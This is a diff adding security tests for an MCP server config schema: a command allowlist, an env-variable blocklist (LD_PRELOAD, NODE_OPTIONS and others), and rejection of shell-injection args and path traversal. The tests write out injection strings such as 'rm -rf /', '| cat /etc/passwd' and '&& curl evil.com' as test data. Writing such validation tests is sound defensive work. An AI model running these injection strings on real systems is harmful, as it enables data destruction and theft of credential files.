@@ -1,4 +1,5 @@
 import { describe, expect, test } from 'bun:test';
+import { ALLOWED_STDIO_COMMANDS } from '../mcp-security';
 import {
   createApprovalPolicySchema,
   createChannelSchema,
@@ -129,10 +130,10 @@ describe('createMCPConfigSchema', () => {
     const result = createMCPConfigSchema.parse({
       serverName: 'my-mcp',
       transportType: 'stdio',
-      command: '/usr/bin/mcp-server',
+      command: 'npx',
     });
     expect(result.transportType).toBe('stdio');
-    expect(result.command).toBe('/usr/bin/mcp-server');
+    expect(result.command).toBe('npx');
   });
 
   test('accepts valid sse config', () => {
@@ -195,6 +196,176 @@ describe('createMCPConfigSchema', () => {
       serverUrl: 'https://mcp.example.com',
     });
     expect(result.channelId).toBeNull();
+  });
+
+  // --- Security tests (issue #5) ---
+
+  describe('command allowlist', () => {
+    for (const cmd of ALLOWED_STDIO_COMMANDS) {
+      test(`allows command: "${cmd}"`, () => {
+        const result = createMCPConfigSchema.parse({
+          serverName: 'ok',
+          transportType: 'stdio',
+          command: cmd,
+        });
+        expect(result.command).toBe(cmd);
+      });
+    }
+
+    const disallowed = ['bash', 'sh', 'curl', 'rm', 'wget', '/usr/bin/mcp-server', 'python'];
+    for (const cmd of disallowed) {
+      test(`rejects command: "${cmd}"`, () => {
+        expect(() =>
+          createMCPConfigSchema.parse({
+            serverName: 'evil',
+            transportType: 'stdio',
+            command: cmd,
+          }),
+        ).toThrow();
+      });
+    }
+  });
+
+  describe('env blocklist', () => {
+    const dangerousKeys = [
+      'LD_PRELOAD',
+      'NODE_OPTIONS',
+      'PATH',
+      'DYLD_INSERT_LIBRARIES',
+      'BASH_ENV',
+    ];
+    for (const key of dangerousKeys) {
+      test(`rejects env key: "${key}"`, () => {
+        expect(() =>
+          createMCPConfigSchema.parse({
+            serverName: 'evil',
+            transportType: 'stdio',
+            command: 'npx',
+            env: { [key]: '/tmp/evil' },
+          }),
+        ).toThrow();
+      });
+    }
+
+    test('rejects env key case-insensitively', () => {
+      expect(() =>
+        createMCPConfigSchema.parse({
+          serverName: 'evil',
+          transportType: 'stdio',
+          command: 'npx',
+          env: { ld_preload: '/tmp/evil.so' },
+        }),
+      ).toThrow();
+    });
+
+    test('allows safe env vars', () => {
+      const result = createMCPConfigSchema.parse({
+        serverName: 'ok',
+        transportType: 'stdio',
+        command: 'npx',
+        env: { MCP_API_KEY: 'secret', DEBUG: 'true' },
+      });
+      expect(result.env).toEqual({ MCP_API_KEY: 'secret', DEBUG: 'true' });
+    });
+  });
+
+  describe('args validation', () => {
+    const maliciousArgs: string[][] = [
+      ['--flag; rm -rf /'],
+      ['valid', '| cat /etc/passwd'],
+      ['&& curl evil.com'],
+      ['$(whoami)'],
+      ['`id`'],
+      ['> /etc/passwd'],
+      ['< /etc/shadow'],
+      ['line1\nline2'],
+      ['null\0byte'],
+    ];
+    for (const args of maliciousArgs) {
+      test(`rejects args with shell metacharacters: ${JSON.stringify(args)}`, () => {
+        expect(() =>
+          createMCPConfigSchema.parse({
+            serverName: 'evil',
+            transportType: 'stdio',
+            command: 'npx',
+            args,
+          }),
+        ).toThrow();
+      });
+    }
+
+    test('rejects more than 20 args', () => {
+      expect(() =>
+        createMCPConfigSchema.parse({
+          serverName: 'evil',
+          transportType: 'stdio',
+          command: 'npx',
+          args: Array.from({ length: 21 }, (_, i) => `arg${i}`),
+        }),
+      ).toThrow();
+    });
+
+    test('rejects arg exceeding 1000 chars', () => {
+      expect(() =>
+        createMCPConfigSchema.parse({
+          serverName: 'evil',
+          transportType: 'stdio',
+          command: 'npx',
+          args: ['a'.repeat(1001)],
+        }),
+      ).toThrow();
+    });
+
+    test('allows safe args', () => {
+      const result = createMCPConfigSchema.parse({
+        serverName: 'ok',
+        transportType: 'stdio',
+        command: 'npx',
+        args: ['-y', '@modelcontextprotocol/server-filesystem', '/home/user/projects'],
+      });
+      expect(result.args).toEqual([
+        '-y',
+        '@modelcontextprotocol/server-filesystem',
+        '/home/user/projects',
+      ]);
+    });
+  });
+
+  describe('cwd validation', () => {
+    const traversalPaths = ['../etc/passwd', '/home/../../etc', '..', 'a/b/../../../c'];
+    for (const cwd of traversalPaths) {
+      test(`rejects path traversal: "${cwd}"`, () => {
+        expect(() =>
+          createMCPConfigSchema.parse({
+            serverName: 'evil',
+            transportType: 'stdio',
+            command: 'npx',
+            cwd,
+          }),
+        ).toThrow();
+      });
+    }
+
+    test('rejects cwd exceeding 500 chars', () => {
+      expect(() =>
+        createMCPConfigSchema.parse({
+          serverName: 'evil',
+          transportType: 'stdio',
+          command: 'npx',
+          cwd: '/a'.repeat(251),
+        }),
+      ).toThrow();
+    });
+
+    test('allows safe absolute cwd', () => {
+      const result = createMCPConfigSchema.parse({
+        serverName: 'ok',
+        transportType: 'stdio',
+        command: 'npx',
+        cwd: '/home/user/mcp-servers',
+      });
+      expect(result.cwd).toBe('/home/user/mcp-servers');
+    });
   });
 });
 
